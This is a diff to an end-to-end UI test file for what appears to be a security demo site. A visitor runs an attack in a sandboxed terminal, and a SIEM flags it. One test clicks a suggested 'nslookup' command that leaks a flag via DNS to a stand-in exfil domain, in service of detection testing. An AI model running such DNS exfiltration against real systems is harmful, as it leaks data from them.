@@ -1304,7 +1304,7 @@ test.describe("the visitor's run, told back (mock, ADR 0035 amendment: UX stage 
   // asks every 1.5 s while one is awaited.
   const URL = "/?mock=1&mock-speed=0.3&mock-siem-delay=3000";
 
-  test("the strip says each step: ready, waiting for the SIEM, Talon's delete, then the SIEM's catch; Open it pulses the card", async ({ page }) => {
+  test("the strip says each step: ready, waiting for the SIEM, Talon's delete, then the SIEM's catch; Open it pulses the card", async ({ page, isMobile }) => {
     test.setTimeout(60_000);
     const problems = guardConsole(page);
     await page.goto(URL);
@@ -1315,7 +1315,10 @@ test.describe("the visitor's run, told back (mock, ADR 0035 amendment: UX stage 
     await expect(msg).toHaveText("Pod ready. uid 10001, no network, read-only root. Type a command.", { timeout: 10_000 });
     // The banner's ready moment: "Pod starting" does not stay at the top of the output.
     await expect(term.locator(".term__out")).not.toContainText("Pod starting");
-    await expect(msg).toHaveAttribute("aria-live", "polite");
+    // One polite live line outside the strip speaks each message; the strip itself is not live.
+    await expect(page.locator(".run-status-live")).toHaveAttribute("aria-live", "polite");
+    await expect(page.locator(".run-status-live")).toHaveText("Pod ready. uid 10001, no network, read-only root. Type a command.");
+    expect(await strip.locator("[aria-live]").count()).toBe(0);
 
     await term.getByRole("button", { name: "nslookup sdp-<flag>.x.exfil.sdp.test." }).click();
     await expect(msg).toHaveText("Waiting for the SIEM (usually 1–3 min)…");
@@ -1335,22 +1338,43 @@ test.describe("the visitor's run, told back (mock, ADR 0035 amendment: UX stage 
     await expect(msg).toHaveText("The SIEM caught your DNS exfil — CRITICAL. Falco never saw it.", { timeout: 15_000 });
     await expect(term.locator('.thisrun__row[data-row="siem"] dd')).toHaveText("CRITICAL — DNS exfiltration ↓");
     await expect(page.locator("#correlation .corr-scenario__state")).toContainText("found it");
-    const own = page.locator('#correlation .corr-tier--pinned .incident--own[data-kind="dns-exfil"]');
+    // The visitor's own incidents have their own heading above the correlation-only tier.
+    const own = page.locator('#correlation .corr-tier--own .incident--own[data-kind="dns-exfil"]');
     await expect(own).toHaveCount(1);
-    await expect(page.locator("#correlation .corr-tier--pinned .incident").first()).toHaveClass(/incident--own/);
-    await strip.getByRole("link", { name: "Open it ↓" }).click();
-    await expect(own).toBeInViewport();
-    await expect(own).toHaveClass(/is-pulsing/);
+    await expect(page.locator("#correlation .corr-tier--own .corr-tier__title")).toHaveText("From your run on this page");
+    await expect(page.locator("#correlation .corr-tier--pinned .incident--own")).toHaveCount(0);
 
-    // Away from the terminal, the toast says the same; dismissed, both go.
+    // Away from the terminal and the board, the toast says the same, one slim line on a phone.
+    await page.evaluate(() => document.getElementById("how")?.scrollIntoView({ behavior: "instant" }));
     const toast = page.locator(".run-toast");
     await expect(toast).toBeVisible();
-    await expect(toast.locator(".run-toast__msg")).toHaveText("The SIEM caught your DNS exfil — CRITICAL. Falco never saw it.");
+    await expect(toast.locator(".run-toast__msg strong")).toHaveText("The SIEM caught your DNS exfil — CRITICAL.");
     expect(await toast.locator("[aria-live]").count()).toBe(0);
-    await toast.getByRole("button", { name: "Dismiss this message" }).click();
+    if (isMobile) {
+      await expect(toast.locator(".run-toast__text")).toBeHidden();
+      await expect(toast.getByRole("button", { name: "Run again" })).toBeHidden();
+    } else {
+      await expect(toast.locator(".run-toast__msg")).toHaveText("The SIEM caught your DNS exfil — CRITICAL. Falco never saw it.");
+    }
+    // Its "Open it" lands on the card with its badge and title below the sticky header, pulses it,
+    // and the toast has done its job.
+    await toast.getByRole("link", { name: "Open it ↓" }).click();
+    await expect(own).toBeInViewport();
+    await expect(own).toHaveClass(/is-pulsing/);
+    await expect.poll(() => page.evaluate(() => (document.querySelector(".incident--own") as HTMLElement).getBoundingClientRect().top - (document.querySelector(".site-header") as HTMLElement).getBoundingClientRect().bottom)).toBeGreaterThanOrEqual(0);
     await expect(toast).toBeHidden();
-    await expect(strip).toBeHidden();
+    // Followed, it stays away for that message, also away from the board again.
+    await page.evaluate(() => document.getElementById("how")?.scrollIntoView({ behavior: "instant" }));
+    await page.waitForTimeout(300);
+    await expect(toast).toBeHidden();
     await noHorizontalScroll(page);
+
+    // "Run again" starts the next session at once (it costs one run).
+    const starts = async () => (await mockCalls(page)).filter((c) => c === "POST /api/attack/terminal").length;
+    expect(await starts()).toBe(1);
+    await strip.getByRole("button", { name: "Run again" }).click();
+    await expect.poll(starts).toBe(2);
+    await expect(term.locator("#term-input")).toBeEnabled({ timeout: 10_000 });
     expect(problems).toEqual([]);
   });
 
@@ -1368,6 +1392,13 @@ test.describe("the visitor's run, told back (mock, ADR 0035 amendment: UX stage 
     await expect(scenario.locator(".corr-scenario__state")).toHaveText("waiting for the SIEM (≈2 min)…");
     await expect(scenario.locator(".corr-scenario__state")).toHaveText("found it: the CRITICAL incident is below ↓", { timeout: 15_000 });
     await expect(scenario.locator(".corr-scenario__state a")).toHaveAttribute("href", /^#incident-d[0-9a-f]{15}$/);
+    // The chip's link lands on the card, its top below the sticky header: followed from the top of the
+    // page (a DOM click, so nothing scrolls the board into view first).
+    await page.evaluate(() => window.scrollTo({ top: 0, behavior: "instant" }));
+    await scenario.locator(".corr-scenario__state a").evaluate((a) => (a as HTMLAnchorElement).click());
+    const card = page.locator("#correlation .corr-tier--own .incident").first();
+    await expect(card).toBeInViewport();
+    await expect.poll(() => card.evaluate((e) => e.getBoundingClientRect().top - (document.querySelector(".site-header") as HTMLElement).getBoundingClientRect().bottom)).toBeGreaterThanOrEqual(0);
   });
 
   test("layout: beside the terminal only this run, never taller than the terminal; the palette full width with its legend; on a phone one card above the input", async ({ page, isMobile }) => {
@@ -1394,6 +1425,12 @@ test.describe("the visitor's run, told back (mock, ADR 0035 amendment: UX stage 
       expect(side.x).toBeGreaterThan(pane.x + pane.width - 1);
       expect(side.y + side.height).toBeLessThanOrEqual(pane.y + pane.height + 1);
       expect(await term.locator(".term__out").evaluate((e) => e.getBoundingClientRect().height)).toBeGreaterThanOrEqual(300);
+      // A panel that scrolls says so: the shop folds first, and a fade marks more below.
+      const st = await term.locator(".thisrun").evaluate((e) => ({ over: e.scrollHeight > e.clientHeight + 1, atEnd: e.getAttribute("data-at-end"), shop: (e.querySelector(".thisrun__shop") as HTMLDetailsElement).open }));
+      if (st.over) {
+        expect(st.shop).toBe(false);
+        expect(st.atEnd).toBe("false");
+      }
     }
   });
 
@@ -1420,13 +1457,24 @@ test.describe("the visitor's run, told back (mock, ADR 0035 amendment: UX stage 
   test("reduced motion: the pulse is a steady outline, no animation", async ({ page }) => {
     await page.emulateMedia({ reducedMotion: "reduce" });
     await page.goto("/?mock=1");
-    const card = page.locator("#correlation .incident").first();
-    await expect(card).toBeVisible();
-    const style = await card.evaluate((e) => {
+    await expect(page.locator("#correlation .incident").first()).toBeVisible();
+    // Re-queried inside the page: the board may have redrawn since the locator resolved.
+    const style = await page.evaluate(() => {
+      const e = document.querySelector("#correlation .incident") as HTMLElement;
       e.classList.add("is-pulsing");
       const cs = getComputedStyle(e);
       return { name: cs.animationName, outline: cs.outlineStyle };
     });
     expect(style).toEqual({ name: "none", outline: "solid" });
+  });
+
+  test("opened at #correlation or #attack, the page lands there once the live parts have rendered", async ({ page }) => {
+    await page.goto("/?mock=1#correlation");
+    await expect(page.locator("#correlation-title")).toBeInViewport({ timeout: 10_000 });
+    await page.waitForTimeout(1500);
+    await expect(page.locator("#correlation-title")).toBeInViewport();
+    await page.goto("/?mock=1#attack");
+    await page.waitForTimeout(1500);
+    await expect(page.locator("#attack-title")).toBeInViewport();
   });
 });
